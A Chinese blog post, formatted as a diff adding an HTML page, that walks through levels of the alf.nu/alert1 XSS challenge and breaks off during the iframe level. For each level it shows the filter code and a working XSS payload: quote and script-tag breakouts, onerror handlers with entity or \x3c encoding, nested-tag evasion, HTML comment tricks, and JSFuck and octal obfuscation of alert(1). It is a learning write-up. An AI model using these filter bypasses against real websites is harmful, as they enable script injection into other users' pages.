@@ -1,0 +1,916 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  
+    <title>alf.nu/alert1总结 | TO DO</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Max">
+    
+
+    
+    <meta name="description" content="在做 alf.nu/alert1 时候的一些总结，主要是xss这种低安全级别的注意事项。">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="alf.nu&#x2F;alert1总结">
+<meta property="og:url" content="http://juniorprincewang.github.io/2018/10/14/alf-nu-alert1总结/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="在做 alf.nu/alert1 时候的一些总结，主要是xss这种低安全级别的注意事项。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-06-12T06:41:26.228Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="alf.nu&#x2F;alert1总结">
+<meta name="twitter:description" content="在做 alf.nu/alert1 时候的一些总结，主要是xss这种低安全级别的注意事项。">
+
+    
+    <link rel="alternative" href="/atom.xml" title="TO DO" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+</html>
+  <body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="TO DO" title="TO DO"></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="TO DO">TO DO</a></h1>
+				<h2 class="blog-motto">吾尝终日而思矣，不如须臾之所学也。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search">
+						<input type="hidden" name="q" value="site:juniorprincewang.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</ul></nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/10/14/alf-nu-alert1总结/" title="alf.nu/alert1总结" itemprop="url">alf.nu/alert1总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Max" target="_blank" itemprop="author">Max</a>
+		
+  </p><p class="article-time">
+    <time datetime="2018-10-14T04:39:04.000Z" itemprop="datePublished"> Published 2018-10-14</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup"><span class="toc-number">1.1.</span> <span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adobe"><span class="toc-number">1.2.</span> <span class="toc-text">Adobe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON"><span class="toc-number">1.3.</span> <span class="toc-text">JSON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript"><span class="toc-number">1.4.</span> <span class="toc-text">JavaScript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Markdown"><span class="toc-number">1.5.</span> <span class="toc-text">Markdown</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM"><span class="toc-number">1.6.</span> <span class="toc-text">DOM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Callback"><span class="toc-number">1.7.</span> <span class="toc-text">Callback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Skandia"><span class="toc-number">1.8.</span> <span class="toc-text">Skandia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Template"><span class="toc-number">1.9.</span> <span class="toc-text">Template</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON2"><span class="toc-number">1.10.</span> <span class="toc-text">JSON2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Callback2"><span class="toc-number">1.11.</span> <span class="toc-text">Callback2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Skandia-2"><span class="toc-number">1.12.</span> <span class="toc-text">Skandia 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsfuck"><span class="toc-number">1.12.1.</span> <span class="toc-text">jsfuck</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe"><span class="toc-number">1.13.</span> <span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TI-S-M"><span class="toc-number">1.14.</span> <span class="toc-text">TI(S)M</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON-3"><span class="toc-number">1.15.</span> <span class="toc-text">JSON 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K’Z’K"><span class="toc-number">1.16.</span> <span class="toc-text">K’Z’K</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K’Z’K-1"><span class="toc-number">1.17.</span> <span class="toc-text">K’Z’K</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#问题总结"><span class="toc-number">2.</span> <span class="toc-text">问题总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#知识补给"><span class="toc-number">3.</span> <span class="toc-text">知识补给</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JS"><span class="toc-number">3.1.</span> <span class="toc-text">JS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+		
+		</div>
+		
+		<p>在做 alf.nu/alert1 时候的一些总结，主要是xss这种低安全级别的注意事项。</p>
+<a id="more"></a>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在html中直接闭合 双引号【”】。</p>
+<h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里双引号被过滤了，只有想办法绕过过滤。</p>
+<ol>
+<li>由题可知过滤方法只将【”】替换为了【&quot;】，没有对【\】本身进行转义，所以我们可以通过输入【&quot;】来进行绕过，我们的【\】会将原本的【\】给转义掉，从而实现绕过！</li>
+<li>直接闭合 <code>&lt;script&gt;</code> 标签即可。</li>
+</ol>
+<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>json.stringify()方法是将一个JavaScript值转换成Json字符串，将一个传入的对象（这里是字符串）加上双引号，并转义【”】，但是会对 【\】 进行转义。<br>这里其实涉及到html标签的优先级，script标签时具有高优先级的，就是说当我们在script标签中出现了 <code>&lt;/script&gt;</code>标签，那么就会闭合前面那个 <code>&lt;script&gt;</code> ，从而实现绕过。</p>
+<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var url = &apos;javascript:console.log(&apos; + JSON.stringify(s) + &apos;)&apos;;</span><br><span class="line">  console.log(url);</span><br><span class="line"></span><br><span class="line">  var a = document.createElement(&apos;a&apos;);</span><br><span class="line">  a.href = url;</span><br><span class="line">  document.body.appendChild(a);</span><br><span class="line">  a.click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次字符串出现在了url中，同样是绕过 【”】，url编码规定在url中url编码会自动解码，但是js是不会解码的，所以url编码后的【”】js是不认识的，所以我们就成功逃过了JSON.stringify对【”】的转义。</p>
+<p>【”】 在 url中的编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from urllib import quote</span><br><span class="line">quote(&quot;\&quot;&quot;)</span><br><span class="line">==&gt; &apos;%22&apos;</span><br></pre></td></tr></table></figure>
+
+<pre><code>%22);alert(1)//</code></pre><h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);</span><br><span class="line">  // URLs</span><br><span class="line">  text = text.replace(/(http:\/\/\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);</span><br><span class="line">  // [[img123|Description]]</span><br><span class="line">  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是某些markdown语法的实现方式。<br>第一条代码： 【&lt;】【”】都被转义为html实体。<br>第二条代码： 将输入的链接自动生成了a标签。<br>第三条代码： Markdown标准插入图片的语法即 [[src|alt]]，【|】左边遍是图片的src，右边是图片的alt属性。 </p>
+<p>从第一条可以基本确定我们想要直接输入 <code>&lt;script&gt;</code> 等标签以及双引号是不太可能的了，第二条是关于url的，那么我们可不可以使用javascript伪协议呢？答案是不行，正则规定了只有 http:// 开头的才可以生成a标签，那么再看一下最后一条，由于第一条的实体编码导致我们输入【”】与【&lt;】都不行了。<br>能不能结合所有已知条件看不能创造【”】，输入 http:// 什么的时候就会自动生成a标签，a标签中就会有双引号，它正好闭合alt的第一个【”】： </p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[1|http://onerror=alert(1)//]]</span><br></pre></td></tr></table></figure>
+
+<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Slightly too lazy to make two input fields.</span><br><span class="line">  // Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">  var m = s.split(/#/);</span><br><span class="line"></span><br><span class="line">  // Only slightly contrived at this point.</span><br><span class="line">  var a = document.createElement(&apos;div&apos;);</span><br><span class="line">  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));</span><br><span class="line">  return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个题目目的是JavaScript中DOM创建DOM节点。我们的目的就是能够执行 <code>alert(1)</code>，那么创建dom节点就那么几个方法，像 <code>Element</code>、 <code>TextNode</code> 这种就没机会了，一个是只能淡出创建空标签，一个是只能输出纯文本，都不能利用。 其他方法还包括Comment，它创建的节点为 <code>&lt;!-- node --&gt;</code> 我们需要闭合 <code>&lt;!--</code> 即可。</p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/createComment" target="_blank" rel="noopener">document.createComment</a></p>
+<h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&apos;]*$/.test(thing[0])) return &apos;Invalid callback&apos;;</span><br><span class="line">  var obj = &#123;&apos;userdata&apos;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/&lt;/g, &apos;\\u003c&apos;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回调函数是有限制的（只能由字母、[、]、单引号组成），不能用任意的，obj是一个序列化后的对象，json转换函数中将【&lt;】替换为十六进制的编码\u003C，这个过滤导致我们无法使用这样的标签。我们可控的就callback与obj的值，callback不一定要是一个函数，我们需要做的就是闭合 <code>({&quot;userdata&quot;:&quot;</code> 这段字符串想办法绕过obj，让它不在是一个对象，否则我们是不可能弹窗的:</p>
+<p>payload<br><code>&#39;#&#39;;alert(1)//</code></p>
+<h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题目中没有过滤函数，仅仅只有一个大小写函数。<br>目标：还是通过关闭存在的 <code>&lt;script&gt;</code> 标签创建一个对大小写不敏感的标签来执行 <code>onerror</code> 函数。<br>需要注意的是 JS 对大小写敏感，html 对大小写不敏感。<br>那么可以创建 <code>&lt;img&gt;</code> 标签，利用其属性函数 <code>onerror</code> ， 将它赋值为 <code>alert(1)</code>，并转换 alter为 <code>html实体字符</code> 就可以完成任务。</p>
+<p>html 字符实体类似这样：</p>
+<blockquote>
+<p>&entity_name;<br>或者<br>&#entity_number;</p>
+</blockquote>
+<p>如需显示小于号，我们必须这样写：<code>&amp;lt;</code> 或 <code>&amp;#60;</code> 或 <code>&amp;#x3c;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binascii.hexlify(&apos;alert&apos;)</span><br><span class="line">Out: &apos;616c657274&apos;</span><br></pre></td></tr></table></figure>
+
+<p>写img标签时，需要加上 <code>src</code> 属性。</p>
+<p><code>&lt;/script&gt;&lt;img src onerror=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</code><br>or<br><code>&lt;/script&gt;&lt;img src onerror=&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74(1)&gt;</code></p>
+<h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function htmlEscape(s) &#123;</span><br><span class="line">    return s.replace(/./g, function(x) &#123;</span><br><span class="line">       return &#123; &apos;&lt;&apos;: &apos;&amp;lt;&apos;, &apos;&gt;&apos;: &apos;&amp;gt;&apos;, &apos;&amp;&apos;: &apos;&amp;amp;&apos;, &apos;&quot;&apos;: &apos;&amp;quot;&apos;, &quot;&apos;&quot;: &apos;&amp;#39;&apos; &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function expandTemplate(template, args) &#123;</span><br><span class="line">    return template.replace(</span><br><span class="line">        /&#123;(\w+)&#125;/g, </span><br><span class="line">        function(_, n) &#123; </span><br><span class="line">           return htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return expandTemplate(</span><br><span class="line">    &quot;                                                \n\</span><br><span class="line">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span><br><span class="line">      &lt;script&gt;                                       \n\</span><br><span class="line">         var v = document.getElementById(&apos;name&apos;);    \n\</span><br><span class="line">         v.innerHTML = &apos;&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;&apos;;       \n\</span><br><span class="line">      &lt;\/script&gt;                                     \n\</span><br><span class="line">    &quot;,</span><br><span class="line">    &#123; name : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后一个return，调用 <code>expandTemplate</code> 函数对一串html元素处理，而 <code>expandTemplate</code> 函数定义里面又调用了 <code>htmlEscape</code> ，<br><code>htmlEscape</code> 对 单双引号，&amp;和&lt;,&gt;都转化为html实体字符了，但没过滤\转义符。</p>
+<p><code>innerHTML</code> 是 JS 字符串，使用十进制或者是十六进制来替换 【&lt;】，【&gt;】，来绕过这个函数。</p>
+<p><code>\x3cimg src onerror=alert(1)\x3e</code><br>or<br><code>\u003cimg src=a onerror=alert(1)\u003e</code></p>
+<h2 id="JSON2"><a href="#JSON2" class="headerlink" title="JSON2"></a>JSON2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s).replace(/&lt;\/script/gi, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>stringify可转义【”】，并且转义【\】，<code>&lt;/script</code>  根据正则表达式替换成空字符串。g是全局模式，i就忽略大小写。</p>
+<p>对付这种正则表达式的办法用字符串拼接。将替换成空的字符串嵌入到目标字符串中。</p>
+<p>payload:<br><code>&lt;/&lt;/scriptscript&gt;&lt;script&gt;alert(1)//</code></p>
+<p>output<br><code>&lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;</code></p>
+<h2 id="Callback2"><a href="#Callback2" class="headerlink" title="Callback2"></a>Callback2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&apos;]*$/.test(thing[0])) return &apos;Invalid callback&apos;;</span><br><span class="line">  var obj = &#123;&apos;userdata&apos;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/\//g, &apos;\\/&apos;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与 <code>Callback</code> 题目类似的，不同之处在于在本题中过滤了反斜杠。这就导致了 <code>Callback</code>的答案中的注释 <code>//</code> 是无法使用的。但是鉴于最后的JavaScript的代码会嵌入了html代码中，因此可以考虑使用html的注释方法来完成本题。<br>javascript 的注释是有三种的，分别为 <code>//</code>  <code>/**/</code>  <code>&lt;!--</code>。</p>
+<p>payload:<br><code>&#39;#&#39;;alert(1)&lt;!--</code></p>
+<p>Output<br><code>&lt;script&gt;&#39;({&quot;userdata&quot;:&quot;&#39;;alert(1)&lt;!--&quot;})&lt;/script&gt;</code></p>
+<h2 id="Skandia-2"><a href="#Skandia-2" class="headerlink" title="Skandia 2"></a>Skandia 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[&lt;&gt;]/.test(s)) return &apos;-&apos;;</span><br><span class="line"></span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一旦匹配到 【&lt;】 和 【&gt;】 就会直接返回 <code>-</code>，又检查大写，但是不能输入 <code>&lt;</code> 和 <code>&gt;</code> ，能不能对alert变换一下呢。<br>参考其他的博客，都说用到了 <code>jsfuck</code>。</p>
+<h3 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h3><p>jsfuck 以这种风格写成的代码中仅使用 <code>[</code> 、 <code>]</code>、 <code>(</code>、 <code>)</code>、 <code>!</code> 和 <code>+</code> 六种字符。此编程风格的名字派生自仅使用较少符号写代码的Brainfuck语言。但与其他深奥编程语言不同的是，以JSFuck风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或JavaScript引擎中的原生JavaScript解释器皆可直接运行。</p>
+<p>加密网站：<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a></p>
+<p>这里仅需要将 <code>&quot;);alert(1)//</code> 中的 <code>alert(1)</code>用jsfuck语言表示出来即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br></pre></td></tr></table></figure>
+
+<p>or 自己筛选字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=!1+URL+!0</span><br></pre></td></tr></table></figure>
+
+<p>在chrome浏览器下，返回的字符串为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">falsefunction URL() &#123; [native code] &#125;true</span><br></pre></td></tr></table></figure>
+
+<p>那么变量 <code>_</code> 即为 字符串 <code>falsefunction URL() { [native code] }true</code> 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fill           =&gt;    _[0]+_[10]+_[2]+_[2]</span><br><span class="line">constructor    =&gt;    _[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]</span><br><span class="line">alert          =&gt;    _[1]+_[2]+_[4]+_[38]+_[9]</span><br></pre></td></tr></table></figure>
+
+<p>只需要在JS中执行  <code>[][&quot;fill&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</code> 即可。</p>
+<p>其对应的JSfuck代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+&apos;(1)&apos;)()</span><br></pre></td></tr></table></figure>
+
+<p>最终的结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+&apos;(1)&apos;)()//</span><br></pre></td></tr></table></figure>
+
+<p>还可以转换成8进制，这样不含有像十六进制字符 <code>x</code> 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][&apos;\160\157\160&apos;][&apos;\143\157\156\163\164\162\165\143\164\157\162&apos;](&apos;\141\154\145\162\164(1)&apos;)()//</span><br></pre></td></tr></table></figure>
+
+<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var tag = document.createElement(&apos;iframe&apos;);</span><br><span class="line"></span><br><span class="line">  // For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br><span class="line">  //</span><br><span 